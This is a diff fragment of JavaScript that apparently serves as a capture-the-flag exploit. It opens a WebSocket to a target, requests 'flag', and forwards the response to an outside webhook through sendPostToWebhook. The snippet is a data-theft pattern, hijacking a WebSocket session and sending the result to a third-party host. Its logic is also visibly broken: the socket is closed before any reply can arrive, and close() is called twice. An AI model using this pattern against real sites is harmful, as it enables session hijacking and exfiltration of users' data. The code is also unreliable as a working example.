@@ -20,7 +20,10 @@
         const socket = new WebSocket(websocketURL);
 
         let flag= ''
-        
+        socket.addEventListener("open", (event) => {
+            socket.send("flag");
+        });
+
         // Open WebSocket connection and send "flag" when connected
         socket.addEventListener("message", (event) => {
     // Store the message in the 'flag' variable
@@ -37,11 +40,7 @@
             }
         });
         // Handle message received from WebSocket
-        socket.onmessage = (event) => {
-            flag = event.data;  // Store the received message in the 'flag' variable
-            console.log("Received message:", flag);
 
-        };
         socket.close();
         sendPostToWebhook(flag);
         socket.close();
